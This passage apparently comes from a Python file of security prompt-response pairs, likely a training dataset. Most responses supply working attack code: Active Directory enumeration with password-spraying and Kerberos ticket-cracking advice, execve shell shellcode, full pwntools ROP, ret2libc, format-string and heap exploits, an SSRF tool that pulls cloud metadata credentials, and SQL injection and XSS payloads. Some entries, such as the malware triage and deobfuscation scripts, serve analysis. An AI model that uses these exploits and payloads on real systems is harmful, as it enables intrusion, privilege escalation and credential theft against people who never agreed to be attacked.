    def find_unconstrained_delegation(self):
        print('\\n[*] Unconstrained delegation:')
        for e in self.search('(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))',
                ['cn','dNSHostName']):
            print(f'  [UNCONSTRAINED] {e.cn}: {e.dNSHostName}')

    def password_policy(self):
        print('\\n[*] Password policy:')
        self.conn.search(self.base_dn,'(objectClass=domain)',
            attributes=['minPwdLength','lockoutThreshold','maxPwdAge'])
        if self.conn.entries:
            e = self.conn.entries[0]
            print(f'  Min length: {e.minPwdLength} | Lockout: {e.lockoutThreshold}')

    def run(self):
        self.enum_users(); self.enum_admins()
        self.find_kerberoastable(); self.find_asreproastable()
        self.find_unconstrained_delegation(); self.password_policy()

if __name__ == '__main__':
    ad = ADEnumerator(sys.argv[1],sys.argv[2],
                     sys.argv[3] if len(sys.argv)>3 else '',
                     sys.argv[4] if len(sys.argv)>4 else '')
    ad.connect(anon=len(sys.argv)<4); ad.run()
```
Install: pip install ldap3. Kerberoastable accounts have SPNs — request service tickets and crack offline with hashcat. ASREPRoastable — no pre-auth required, capture AS-REP and crack offline without credentials. Unconstrained delegation machines store TGTs in memory — compromise to steal domain admin tickets. Password policy shows lockout threshold — spray safely below it. Anonymous bind often works in misconfigured environments."""),
]

bv = [
("Explain x86-64 stack layout during function calls and how buffer overflows corrupt it.",
"""Stack layout for x86-64 function call:
```
High addresses
┌─────────────────────┐
│   Caller's frame    │
├─────────────────────┤  <- Previous RSP
│   Return address    │  8 bytes (address to return to after function)
├─────────────────────┤
│   Saved RBP         │  8 bytes (caller's base pointer)
├─────────────────────┤  <- RBP (current frame base)
│   Local variables   │  e.g., char buf[64] = 64 bytes
├─────────────────────┤  <- RSP (stack pointer, grows downward)
Low addresses
```
Buffer overflow mechanism:
1. gets(buf) writes user input with no length check
2. Input >64 bytes: overflows into saved RBP (8 bytes overwrite)
3. Input >72 bytes: overwrites the return address
4. Function returns: RET pops return address from stack into RIP
5. RIP now attacker-controlled -> arbitrary code execution

Finding exact offset:
```bash
# Generate cyclic pattern with pwntools
python3 -c "import pwn; print(pwn.cyclic(200))" | ./vulnerable_binary
# In GDB/pwndbg after crash:
# pwndbg> cyclic_find($rsp)  # gives exact byte offset
```
Modern protections and bypasses:
- Stack canary: random value before saved RBP, checked on return -> brute force or leak
- ASLR: randomises load addresses -> info leak to defeat
- NX/DEP: stack not executable -> ROP chains (no shellcode needed)
- PIE: binary itself randomised -> PIE leak required
Each protection layer requires a different bypass technique. checksec ./binary always first."""),

("Write x86-64 shellcode to spawn a shell and explain each instruction.",
"""```nasm
; x86-64 Linux execve('/bin/sh', NULL, NULL) — 27 bytes
; syscall number: execve = 59 = 0x3b
; rdi = filename, rsi = argv (NULL), rdx = envp (NULL)

global _start
section .text
_start:
    xor     rsi, rsi        ; rsi = 0 (argv = NULL, no null bytes)
    xor     rdx, rdx        ; rdx = 0 (envp = NULL)
    xor     rax, rax        ; rax = 0
    push    rax             ; push null terminator
    mov     rax, 0x68732f2f6e69622f  ; '/bin//sh' little-endian
    push    rax             ; '/bin//sh\0' on stack
    mov     rdi, rsp        ; rdi -> '/bin//sh' string
    xor     rax, rax        ; rax = 0
    mov     al, 59          ; rax = 59 (execve), avoids null bytes
    xor     rsi, rsi        ; argv = NULL
    xor     rdx, rdx        ; envp = NULL
    syscall                 ; kernel execve('/bin//sh', NULL, NULL)
```

Compile and extract bytes:
```bash
nasm -f elf64 shell.asm -o shell.o && ld shell.o -o shell
./shell  # test
# Extract shellcode bytes:
objdump -d shell | grep -Po '\s[0-9a-f]{2}' | tr -d ' \n'
```

Resulting shellcode (27 bytes):
```python
shellcode = (
    b'\\x48\\x31\\xf6'       # xor rsi, rsi
    b'\\x48\\x31\\xd2'       # xor rdx, rdx
    b'\\x48\\x31\\xc0'       # xor rax, rax
    b'\\x50'                  # push rax
    b'\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68'  # mov rax, '/bin//sh'
    b'\\x50'                  # push rax
    b'\\x48\\x89\\xe7'       # mov rdi, rsp
    b'\\x48\\x31\\xc0'       # xor rax, rax
    b'\\xb0\\x3b'            # mov al, 59
    b'\\x48\\x31\\xf6'       # xor rsi, rsi
    b'\\x48\\x31\\xd2'       # xor rdx, rdx
    b'\\x0f\\x05'            # syscall
)
```

Null byte avoidance (critical — strcpy stops at null bytes):
- `mov al, 59` instead of `mov rax, 59` — upper bytes already 0 from XOR, no null bytes generated
- XOR for zeroing instead of MOV reg, 0
- Double slash '/bin//sh' makes it exactly 8 bytes for clean push
NX enabled? ROP chains instead — no shellcode. ASLR? Leak an address first."""),

("Explain ROP (Return-Oriented Programming) and build a ROP chain to bypass NX.",
"""ROP bypasses NX/DEP by chaining existing code snippets ('gadgets') ending in 'ret' — no new code needed, just reuse what's already in the binary/libc.

```
Stack layout for ROP chain:
[padding x offset]      <- fills buffer + saved rbp
[gadget1_addr]          <- ret instruction pops this into RIP
[gadget1_data]          <- consumed by gadget (e.g. pop rdi takes this into rdi)
[gadget2_addr]
[gadget2_data]
...
[system_addr]           <- final: call system('/bin/sh')
```

```python
from pwn import *

binary = './vuln'
elf = ELF(binary); libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]  # stack alignment for system()
OFFSET = 72  # bytes to RIP (find with cyclic pattern + GDB)

# === Stage 1: Leak libc address via puts(puts@GOT) ===
payload1 = flat(
    b'A' * OFFSET,
    pop_rdi,           # pop rdi; ret
    elf.got['puts'],   # arg: address of puts in GOT
    elf.plt['puts'],   # call puts(puts@GOT) -> prints real libc puts addr
    elf.sym['main']    # return to main for stage 2
)

p = process(binary)
p.sendlineafter(b'Input: ', payload1)
p.recvline()
leak = u64(p.recv(8).strip().ljust(8, b'\\x00'))
libc.address = leak - libc.sym['puts']
print(f'[*] libc base: {hex(libc.address)}')

# === Stage 2: call system('/bin/sh') with known libc base ===
payload2 = flat(
    b'A' * OFFSET,
    ret,                             # align RSP to 16 bytes (system() ABI requirement)
    pop_rdi,                         # pop rdi; ret
    next(libc.search(b'/bin/sh')),   # '/bin/sh' string in libc
    libc.sym['system']               # system('/bin/sh')
)
p.sendlineafter(b'Input: ', payload2)
p.interactive()
```

Finding gadgets:
```bash
ROPgadget --binary ./vuln --rop | grep 'pop rdi'
# pwntools built-in: rop.find_gadget(['pop rdi', 'ret'])
```

Stack alignment: System() (and many libc functions) require RSP to be 16-byte aligned when called. If shell exits immediately, add a bare 'ret' gadget before system(). Common ROP primitives: pop rdi (arg1), pop rsi (arg2), pop rdx (arg3), ret2plt (leak), ret2libc (shell)."""),

("Explain heap exploitation: tcache poisoning and use-after-free.",
"""Modern heap exploitation targets glibc malloc's internal structures for arbitrary read/write.

**tcache poisoning (glibc 2.26-2.31)**
```c
// tcache: per-thread free list, LIFO, up to 7 entries per size class
// If we can write to a freed chunk's fd pointer -> arbitrary malloc return

char* a = malloc(0x20);  char* b = malloc(0x20);
free(a);  // tcache: [A -> NULL]
free(b);  // tcache: [B -> A -> NULL]
// UAF or overflow: overwrite B's fd
*(char**)b = target_address;  // tcache: [B -> target -> ...]
malloc(0x20);  // returns B
malloc(0x20);  // returns target_address -- write anything here!
```

**Safe-linking bypass (glibc 2.32+)**
```c
// Stored ptr = (chunk_address >> 12) XOR next_ptr
// Must leak heap address to compute correct mangled value
uint64_t heap_key = heap_leak >> 12;
uint64_t mangled = heap_key ^ target_address;
write_to_freed_chunk(mangled);  // tcache accepts mangled pointer
```

**Use-after-free exploitation**
```python
from pwn import *
p = process('./vuln_uaf')
# 1. Create object (allocates heap chunk)
p.sendline(b'1')
# 2. Free it (chunk goes to tcache)
p.sendline(b'3')
# 3. Allocate same-size object with evil function pointer
# tcache returns the freed chunk -> same memory location
evil_addr = ELF('./vuln_uaf').sym['win_function']
payload = b'A' * 32 + p64(evil_addr)  # 32 bytes padding + function ptr
p.sendline(b'2'); p.sendline(payload)
# 4. Trigger UAF -- original pointer calls our evil function
p.sendline(b'4')
p.interactive()
```

**House of Spirit -- fake chunk trick**
```python
# Plant fake chunk at attacker-controlled address (stack, BSS, etc.)
# Size field must match a tcache/fastbin size class
# Free the fake chunk -> malloc returns it -> arbitrary write
fake_size = 0x31  # must match allocation size
write(fake_chunk_addr, p64(0) + p64(fake_size))   # prev_size + size
free_ptr(fake_chunk_addr + 0x10)                   # free fake chunk
malloc(0x20)   # returns fake_chunk -> write to stack!
```

Tools: pwndbg 'heap', 'bins', 'vis_heap_chunks' commands. ASAN catches heap corruption without crash. Double-free: free same chunk twice -> loop in free list -> two separate mallocs return same address."""),

("Explain format string vulnerabilities and write an exploit.",
"""Format string: User input passed as format argument to printf family — user controls format specifiers.

```c
printf(user_input);         // VULNERABLE: user can use %n, %p, %s
printf("%s", user_input);   // SAFE: user input is data only
```

Exploit primitives:
```python
from pwn import *
p = process('./vuln')
elf = ELF('./vuln')

# === Step 1: Find our offset on the stack ===
# Send unique marker + %p chain to see which position holds our input
p.sendline(b'AAAA.' + b'%p.' * 20)
# Count from output which position shows 0x41414141 = our offset N
N = 7  # example

# === Step 2: READ arbitrary address ===
# %7$s reads the string pointed to by arg 7 (our address we put on stack)
target_addr = elf.got['puts']  # read what puts() resolved to (ASLR leak)
payload = p32(target_addr) + f'%{N}$s'.encode()
p.sendline(payload)
leak = u32(p.recv(4))
libc_base = leak - libc.sym['puts']
print(f'[*] libc base: {hex(libc_base)}')

# === Step 3: WRITE arbitrary address (%n writes byte count to pointer) ===
# Overwrite puts@GOT with system() address
# Use %hn (short write, 2 bytes at a time) to avoid huge padding

target = elf.got['puts']
value = libc_base + libc.sym['system']
low  = value & 0xffff
high = (value >> 16) & 0xffff
if high < low: high += 0x10000

payload  = p32(target)       # write low 2 bytes to puts@GOT
payload += p32(target + 2)   # write high 2 bytes to puts@GOT+2
payload += f'%{low - 8}c'.encode()    # print (low-8) chars
payload += f'%{N}$hn'.encode()        # write count to target (low 2 bytes)
payload += f'%{high - low}c'.encode() # print more chars
payload += f'%{N+1}$hn'.encode()      # write count to target+2 (high 2 bytes)

p.sendline(payload)
# Next puts('/bin/sh') call -> system('/bin/sh')
p.interactive()
```

Why %n works: printf counts characters printed so far, writes that count to int* argument. Control count with padding (%Nc), control which argument with positional (%N$n). %hn = half-word (2 bytes), %hhn = byte. Detection: compiler flag -Wformat-security warns on format string bugs. Mitigation: always use printf("%s", input) never printf(input)."""),

("Explain ASLR bypass via GOT leak and ret2plt technique.",
"""GOT (Global Offset Table) and PLT (Procedure Linkage Table) — dynamic linking mechanism that becomes our exploitation primitive.

```
How dynamic linking works:
puts@PLT -> GOT[puts] -> (first call: linker resolves) -> real puts() in libc
                      -> (subsequent calls: direct jump to libc puts)

GOT contains real runtime addresses of libc functions.
If we can read GOT[puts], we know where libc loaded (defeats ASLR).
```

```python
from pwn import *
binary = './vuln'
elf = ELF(binary); libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Addresses (fixed even with PIE if binary has no PIE, or leaked if PIE)
puts_plt = elf.plt['puts']   # PLT stub - fixed (no PIE)
puts_got = elf.got['puts']   # GOT entry - fixed offset (no PIE)
main     = elf.sym['main']   # return here after leak

OFFSET = 72
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# === Stage 1: Leak GOT entry ===
payload1 = flat(b'A'*OFFSET, pop_rdi, puts_got, puts_plt, main)
p = process(binary)
p.sendlineafter(b'> ', payload1)
p.recvline()
leaked = u64(p.recv(6).ljust(8, b'\\x00'))  # 6 bytes (ASLR uses 47-bit addresses)
libc.address = leaked - libc.sym['puts']
print(f'[*] libc base: {hex(libc.address)}')

# === Stage 2: system('/bin/sh') with known libc base ===
ret = rop.find_gadget(['ret'])[0]  # stack alignment
payload2 = flat(
    b'A'*OFFSET, ret, pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
)
p.sendlineafter(b'> ', payload2)
p.interactive()
```

RELRO levels (check with checksec):
- No RELRO: GOT writable, GOT overwrite works
- Partial RELRO: GOT writable, ret2plt for leak then ret2libc  
- Full RELRO: GOT marked read-only at startup -> GOT overwrite impossible, use __malloc_hook/__free_hook (pre-glibc 2.34) or other write primitives

PIE enabled: binary itself randomised, need info leak for binary addresses too. Two leaks needed: one for libc, one for binary. Stack leak or format string often provides both."""),
]

bw = [
("Walk through reverse engineering a Linux binary to find hidden functionality.",
"""Static -> dynamic analysis workflow for cracking/reversing ELF binaries.

```bash
# Step 1: Reconnaissance
file ./target && checksec ./target
strings ./target | grep -iE '(pass|flag|secret|key|correct|wrong|admin)'
# Quick win: password often in plaintext strings

# Step 2: Dynamic tracing -- ltrace catches library calls
ltrace ./target <<< 'testpassword' 2>&1
# Output: strcmp("testpassword", "s3cr3t_p4ss") = 1
# strcmp non-zero = wrong password. Password revealed: s3cr3t_p4ss

strace ./target <<< 'test' 2>&1 | grep -E '(read|write|open|compare)'
# Shows syscalls -- reveals file reads, network, etc.

# Step 3: Disassembly with radare2
r2 -A ./target
# Interactive shell:
# afl              -- list all functions
# pdf @main        -- disassemble main
# pdf @sym.check_password
# iz               -- list strings with addresses
# /x deadbeef      -- search for hex pattern

# Step 4: Ghidra decompilation (NSA tool, free)
# Import binary, auto-analyse, navigate to main()
# Decompiler gives pseudo-C:
```
```c
// Ghidra output example:
int check_password(char *input) {
    char buf[32];
    int stored_len;
    // XOR decode loop -- common obfuscation
    for (int i = 0; i < 16; i++) {
        buf[i] = encoded_password[i] ^ 0x42;  // XOR key = 0x42
    }
    return strcmp(input, buf) == 0;
}
// Decode XOR password:
encoded = [0x31,0x27,0x26,0x25,0x57,0x24,0x3d,0x24]
key = 0x42
password = ''.join(chr(b^key) for b in encoded)
print(password)  # 'secret!f'
```
```python
# Step 5: Dynamic bypass with Frida (hook without modifying binary)
import frida, sys
script = """
Interceptor.attach(Module.getExportByName(null, 'strcmp'), {
    onEnter(args) {
        const a = args[0].readUtf8String();
        const b = args[1].readUtf8String();
        if (a && b) console.log('[strcmp] ' + a + ' vs ' + b);
    }
});
"""
session = frida.spawn(['./target'], resume=False)
s = session.create_script(script); s.load(); frida.resume(session.pid)
sys.stdin.read()
```
Tool stack: Ghidra (free, best decompiler), IDA Pro (industry standard), Binary Ninja, r2 (free CLI). Frida for runtime hooking without source. pwndbg extension for GDB gives heap/stack visualization. Anti-debug detection: IsDebuggerPresent, timing checks, ptrace(PTRACE_TRACEME) -- patch with r2 or nop out in memory."""),

("Write a Python script to decode common malware obfuscation techniques.",
"""```python
import base64, hashlib, struct, re, math, sys
from pathlib import Path

def xor_single_key(data: bytes):
    'Brute-force single-byte XOR -- assumes result is printable ASCII.'
    best_score, best_key, best_result = 0, 0, b''
    for key in range(256):
        decoded = bytes(b ^ key for b in data)
        score = sum(1 for b in decoded if 32 <= b < 127)
        if score > best_score:
            best_score, best_key, best_result = score, key, decoded
    return best_key, best_result

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = []
    for byte in data:
        i = (i+1)%256; j=(j+S[i])%256; S[i],S[j]=S[j],S[i]
        out.append(byte ^ S[(S[i]+S[j])%256])
    return bytes(out)

def entropy(data: bytes) -> float:
    if not data: return 0
    freq = {}
    for b in data: freq[b] = freq.get(b,0)+1
    return -sum((c/len(data))*math.log2(c/len(data)) for c in freq.values())

def analyse_binary(path: str):
    data = Path(path).read_bytes()
    print(f'[*] Analysing {path} ({len(data)} bytes)')

    # High-entropy regions (encrypted/packed)
    print('\\n[*] High-entropy regions:')
    chunk = 256
    for off in range(0, len(data)-chunk, chunk):
        e = entropy(data[off:off+chunk])
        if e > 7.2: print(f'  Offset {hex(off)}: entropy={e:.2f} (likely encrypted)')

    # XOR bruteforce on suspicious regions
    print('\\n[*] XOR key detection:')
    for plain in [b'http', b'cmd', b'GET ', b'POST', b'MZ']:
        for off in range(len(data)-len(plain)):
            candidate = bytes(c^p for c,p in zip(data[off:off+len(plain)], plain))
            if len(set(candidate)) == 1:
                key = candidate[0]
                region = data[off:off+64]
                decoded = bytes(b^key for b in region)
                if all(32<=b<127 or b in (9,10,13) for b in decoded):
                    print(f'  XOR key=0x{key:02x} at {hex(off)}: {decoded[:50]}')

    # Base64 blobs
    print('\\n[*] Base64 blobs:')
    for m in re.finditer(b'[A-Za-z0-9+/]{20,}={0,2}', data):
        try:
            dec = base64.b64decode(m.group())
            printable = sum(1 for b in dec if 32<=b<127)/len(dec) if dec else 0
            if printable > 0.7: print(f'  at {hex(m.start())}: {dec[:80]}')
        except: pass

    # Unicode strings (Windows malware common)
    print('\\n[*] Unicode strings:')
    for s in re.findall(b'(?:[\\x20-\\x7e]\\x00){4,}', data)[:10]:
        print(f'  {s.decode("utf-16-le",errors="ignore")}')

# Demo
if __name__ == '__main__':
    if len(sys.argv) > 1:
        analyse_binary(sys.argv[1])
    else:
        # Demo XOR decode
        sample = bytes(c^0x42 for c in b'secret_password')
        key, decoded = xor_single_key(sample)
        print(f'XOR bruteforce: key=0x{key:02x} -> {decoded}')
        # Demo RC4
        ct = rc4(b'hello world', b'key')
        pt = rc4(ct, b'key')  # RC4 is symmetric
        print(f'RC4 roundtrip: {pt}')
```
Entropy >7.2: almost certainly encrypted or compressed -- these sections contain runtime-decoded strings. XOR single-byte: most common malware obfuscation, bruteforceable in milliseconds. RC4: appears in many RATs and droppers. Base64: often layered (base64 + XOR). For .NET: dnSpy decompiles to C# directly. For packed PE: run in sandbox, dump from memory after OEP (original entry point). YARA rules match decoded string patterns for family identification."""),

("Analyse malware persistence, C2, and evasion techniques from static analysis.",
"""Static malware analysis workflow -- always in isolated VM, never execute on host.

```bash
# Initial triage
file malware.exe; sha256sum malware.exe
# Submit hash to: VirusTotal, MalwareBazaar, Any.run

# PE structure analysis
python3 - << 'EOF'
import pefile
pe = pefile.PE('malware.exe')
print('[*] Imports:')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    dll = entry.dll.decode()
    imports = [i.name.decode() if i.name else str(i.ordinal) for i in entry.imports]
    print(f'  {dll}: {", ".join(imports[:5])}...')
print(f'[*] Section entropies:')
for s in pe.sections:
    data = s.get_data()
    import math
    freq = {}
    for b in data: freq[b]=freq.get(b,0)+1
    h = -sum((c/len(data))*math.log2(c/len(data)) for c in freq.values()) if data else 0
    print(f'  {s.Name.decode().strip(chr(0))}: entropy={h:.2f}')
EOF

# String analysis
strings -n 6 malware.exe | tee strings.txt
grep -iE '(http|https|ftp|socket|connect|recv|send)' strings.txt    # C2
grep -iE '(HKEY|registry|Software\\\\Microsoft|CurrentVersion\\\\Run)' strings.txt  # persistence
grep -iE '(cmd.exe|powershell|wscript|mshta|regsvr32)' strings.txt  # execution
grep -iE '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' strings.txt  # IPs
```

```python
# Classify suspicious imports
SUSPICIOUS_IMPORTS = {
    # Injection
    'VirtualAllocEx': 'Remote process memory allocation (injection)',
    'WriteProcessMemory': 'Write to remote process (injection)',
    'CreateRemoteThread': 'Execute in remote process (injection)',
    'NtUnmapViewOfSection': 'Process hollowing',
    # Persistence
    'RegSetValueEx': 'Registry modification (persistence)',
    'CreateService': 'Service creation (persistence)',
    'SchtasksW': 'Scheduled task (persistence)',
    # Credential access
    'LsaQueryInformationPolicy': 'LSA credential access',
    'SamOpenDatabase': 'SAM database access',
    # Anti-analysis
    'IsDebuggerPresent': 'Debugger detection',
    'CheckRemoteDebuggerPresent': 'Remote debugger detection',
    'GetTickCount': 'Timing check (anti-sandbox)',
    # Network C2
    'InternetOpenW': 'HTTP C2 (WinINet)',
    'HttpSendRequestW': 'HTTP request (C2)',
    'WSAStartup': 'Raw socket C2',
}

# Common evasion techniques from strings
EVASION_PATTERNS = {
    'VMware': 'Anti-VM: VMware detection',
    'VirtualBox': 'Anti-VM: VirtualBox detection', 
    'VBOX': 'Anti-VM: VirtualBox registry check',
    'wine_get_version': 'Anti-VM: Wine detection',
    'SandboxieControl': 'Anti-sandbox: Sandboxie detection',
    'cuckoomon': 'Anti-sandbox: Cuckoo detection',
    'Sleep': 'Anti-sandbox: Delay execution past timeout',
}

# Entropy-based packing detection
# Section entropy > 7.0: packed/encrypted -> unpack before static analysis
# Tools: UPX -d (for UPX-packed), x64dbg with Scylla to dump memory
```

Dynamic analysis tools (isolated VM only):
- Process Monitor: captures Registry/File/Network/Process events
- Wireshark: capture C2 traffic (filter: `http or dns or tcp.flags.syn==1`)
- Regshot: snapshot registry before/after execution -- shows persistence
- Any.run / Cuckoo Sandbox: automated behavioural report
- Remnux Linux: pre-built malware analysis VM with all tools"""),
]

bx_data = [
("Build a Python protocol fuzzer using Scapy for network vulnerability discovery.",
"""```python
from scapy.all import *
import random, struct, time, sys

class ProtocolFuzzer:
    def __init__(self, target_ip, target_port, iface=None):
        self.target = target_ip; self.port = target_port
        self.iface = iface; self.crashes = []

    def mutate(self, data):
        data = bytearray(data or b'A')
        s = random.randint(0,7)
        if s==0 and data: data[random.randint(0,len(data)-1)] ^= 1<<random.randint(0,7)
        elif s==1 and data: data[random.randint(0,len(data)-1)] = random.choice([0,1,0x7f,0x80,0xff])
        elif s==2:
            pos=random.randint(0,len(data))
            data=data[:pos]+bytearray(random.randint(0,255) for _ in range(random.randint(1,64)))+data[pos:]
        elif s==3 and len(data)>1: del data[random.randint(0,len(data)-1)]
        elif s==4: data=bytearray(b'A'*random.choice([256,1024,4096,65536]))
        elif s==5: data=bytearray(random.choice([b'%s%n%x%p',b'%08x'*20,b"' OR 1=1--"]))
        elif s==6 and len(data)>=4:
            idx=random.randint(0,len(data)-4)
            data[idx:idx+4]=struct.pack('>I',random.choice([0xffffffff,0x7fffffff,0x80000000]))
        elif s==7:
            pos=random.randint(0,len(data))
            data=data[:pos]+bytearray(b'\\x00'*random.randint(1,10))+data[pos:]
        return bytes(data)

    def send_tcp(self, payload):
        sp = random.randint(1024,65535)
        pkt = IP(dst=self.target)/TCP(sport=sp,dport=self.port,flags='PA')/Raw(load=payload)
        resp = sr1(pkt, timeout=2, verbose=False)
        return resp.summary() if resp else 'no response'

    def http_seeds(self):
        templates = []
        for method in [b'GET',b'POST',b'PUT',b'DELETE',b'OPTIONS']:
            for path in [b'/',b'/admin',b'/api/users',b'/../etc/passwd']:
                pkt = method+b' '+path+b' HTTP/1.1\\r\\nHost: '+self.target.encode()+b'\\r\\n\\r\\n'
                templates.append(pkt)
        return templates

    def fuzz_http(self, iterations=500):
        seeds = self.http_seeds()
        print(f'[*] HTTP fuzzing {self.target}:{self.port} | {iterations} iterations')
        t0 = time.time()
        for i in range(iterations):
            mutated = self.mutate(random.choice(seeds))
            try:
                resp = self.send_tcp(mutated)
                if '500' in resp:
                    print(f'[!] 500 error at iter {i}: {resp[:80]}')
                    self.crashes.append({'iter':i,'payload':mutated.hex(),'resp':resp})
            except Exception as e:
                print(f'[CRASH?] {i}: {e}')
            if i%100==0: print(f'[*] {i}/{iterations} | {time.time()-t0:.0f}s')

    def fuzz_dns(self, iterations=200):
        print(f'[*] DNS fuzzing {self.target}:53')
        for i in range(iterations):
            name = ''.join(chr(random.randint(97,122)) for _ in range(random.randint(1,63)))
            pkt = IP(dst=self.target)/UDP(dport=53)/DNS(
                id=random.randint(0,65535), rd=1,
                qd=DNSQR(qname=f'{name}.example.com',
                          qtype=random.choice([1,2,5,15,255])))
            sr1(pkt, timeout=1, verbose=False)

if __name__ == '__main__':
    f = ProtocolFuzzer(sys.argv[1], int(sys.argv[2]))
    f.fuzz_http()
```
Scapy allows crafting packets at any layer — full control over every field. HTTP fuzzer targets: path (traversal), method (unusual verbs trigger parser bugs), headers (injection). DNS fuzzer: label length overflows, compression pointer manipulation, unusual QTYPE values. For production: boofuzz (successor to Sulley) has built-in protocol primitives and crash detection. TLS fuzzing: tlsfuzzer library. ASAN + fuzzer: compile target with -fsanitize=address to catch memory bugs that don't immediately crash."""),

("Build a Python tool to detect and exploit SSRF vulnerabilities.",
"""```python
import requests, sys, socket, ipaddress, re
from urllib.parse import urlparse, urljoin

INTERNAL_PROBES = [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://169.254.169.254/latest/meta-data/',   # AWS metadata
    'http://169.254.169.254/computeMetadata/v1/',  # GCP metadata
    'http://metadata.google.internal/',
    'http://192.168.1.1/',                          # Router admin
    'http://10.0.0.1/',
    'http://0.0.0.0/',
    'http://[::1]/',                                # IPv6 localhost
    'http://0177.0.0.01/',                          # Octal encoding
    'http://0x7f000001/',                           # Hex encoding
    'http://2130706433/',                            # Integer encoding of 127.0.0.1
    'http://localtest.me/',                         # DNS-based bypass
]

BYPASS_PAYLOADS = [
    'http://127.0.0.1@evil.com/',
    'http://evil.com#@127.0.0.1/',
    'http://127.127.127.127/',
    'http://127.0.1.3/',
    'http://0/',
]

class SSRFScanner:
    def __init__(self, base_url, param, method='GET', headers=None, cookies=None):
        self.base = base_url; self.param = param; self.method = method.upper()
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
        if headers: self.session.headers.update(headers)
        if cookies: self.session.cookies.update(cookies)
        self.findings = []

    def send(self, url_value):
        params = {self.param: url_value}
        try:
            if self.method == 'GET':
                r = self.session.get(self.base, params=params, timeout=8)
            else:
                r = self.session.post(self.base, data=params, timeout=8)
            return r
        except requests.ConnectionError as e:
            return None
        except Exception: return None

    def get_baseline(self):
        r = self.send('http://example.com')
        if r: return len(r.text), r.status_code
        return 0, 0

    def detect_ssrf(self):
        print(f'[*] SSRF scan: {self.base} param={self.param}')
        baseline_len, baseline_code = self.get_baseline()
        print(f'[*] Baseline: {baseline_len}b, HTTP {baseline_code}')

        for probe in INTERNAL_PROBES:
            r = self.send(probe)
            if not r: continue
            # Different response = server fetched different content
            significant_diff = abs(len(r.text) - baseline_len) > 50
            aws_indicators = ['ami-id','instance-id','security-credentials','iam']
            gcp_indicators = ['instance','project','serviceAccounts']
            if any(ind in r.text.lower() for ind in aws_indicators):
                print(f'[CRITICAL] AWS metadata accessible via SSRF: {probe}')
                print(f'  Response: {r.text[:200]}')
                self.findings.append({'type':'SSRF_AWS_METADATA','probe':probe})
            elif any(ind in r.text.lower() for ind in gcp_indicators):
                print(f'[CRITICAL] GCP metadata accessible via SSRF: {probe}')
                self.findings.append({'type':'SSRF_GCP_METADATA','probe':probe})
            elif significant_diff and r.status_code != 400:
                print(f'[HIGH] SSRF possible: {probe} -> {len(r.text)}b (diff: {len(r.text)-baseline_len:+d})')
                self.findings.append({'type':'SSRF_POSSIBLE','probe':probe,'diff':len(r.text)-baseline_len})

        # Port scan via SSRF -- timing difference reveals open ports
        print('\\n[*] Internal port scan via SSRF...')
        for port in [22,80,443,8080,8443,3306,5432,6379,27017]:
            probe = f'http://127.0.0.1:{port}/'
            t0 = __import__('time').time()
            r = self.send(probe)
            elapsed = __import__('time').time() - t0
            if r and r.status_code not in (0, 400, 403):
                print(f'  [PORT OPEN] 127.0.0.1:{port} -> HTTP {r.status_code} ({elapsed:.2f}s)')
            elif elapsed > 5:
                print(f'  [MAYBE OPEN] 127.0.0.1:{port} -> timeout ({elapsed:.2f}s)')

        return self.findings

if __name__ == '__main__':
    scanner = SSRFScanner(sys.argv[1], sys.argv[2],
                         sys.argv[3] if len(sys.argv)>3 else 'GET')
    scanner.detect_ssrf()
```
SSRF (Server-Side Request Forgery): server fetches a URL we control -> access internal services behind firewall. AWS metadata endpoint (169.254.169.254) returns IAM credentials in plaintext -> full cloud account takeover. Port scanning via SSRF: open ports return faster/different responses than closed. Bypass techniques: IPv6 (::1), octal encoding (0177.0.0.01), hex (0x7f000001), integer (2130706433) -- all resolve to 127.0.0.1 but bypass naive string checks. Mitigation: allowlist of permitted domains, DNS rebinding protection."""),
]

by_d = [
("Build a Python web application scanner for OWASP Top 10 vulnerabilities.",
"""```python
import requests, re, sys
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from typing import List

class WebScanner:
    def __init__(self, base_url, cookies=None, headers=None):
        self.base = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 Security-Scanner'
        if headers: self.session.headers.update(headers)
        if cookies: self.session.cookies.update(cookies)
        self.findings = []; self.visited = set()

    def log(self, severity, vuln, url, detail=''):
        icons = {'CRITICAL':'[!!!]','HIGH':'[!! ]','MEDIUM':'[!  ]','LOW':'[.  ]','INFO':'[   ]'}
        print(f"{icons.get(severity,'[?]')} {severity} | {vuln}: {url}")
        if detail: print(f"      {detail[:180]}")
        self.findings.append({'severity':severity,'vuln':vuln,'url':url,'detail':detail})

    def get_forms(self, url):
        try:
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            forms = []
            for form in soup.find_all('form'):
                inputs = {i.get('name',''):i.get('value','') for i in form.find_all(['input','textarea']) if i.get('name')}
                forms.append({'action':urljoin(url,form.get('action',url)),
                              'method':form.get('method','get').upper(),'inputs':inputs})
            return forms
        except: return []

    def check_sqli(self, url, params):
        errors = ['sql syntax','mysql','ora-','syntax error','unclosed quotation','pg_query','sqlite_error']
        for param,val in params.items():
            for payload in ["'","'\"","' OR '1'='1","' OR 1=1--"]:
                try:
                    r = self.session.get(url, params={**params,param:payload}, timeout=8)
                    for err in errors:
                        if err in r.text.lower():
                            self.log('CRITICAL','SQL Injection',url,f'param={param} payload={payload!r} error={err}')
                            return
                except: pass

    def check_xss(self, url, forms):
        payloads = ['<script>alert(1)</script>','"><script>alert(1)</script>',
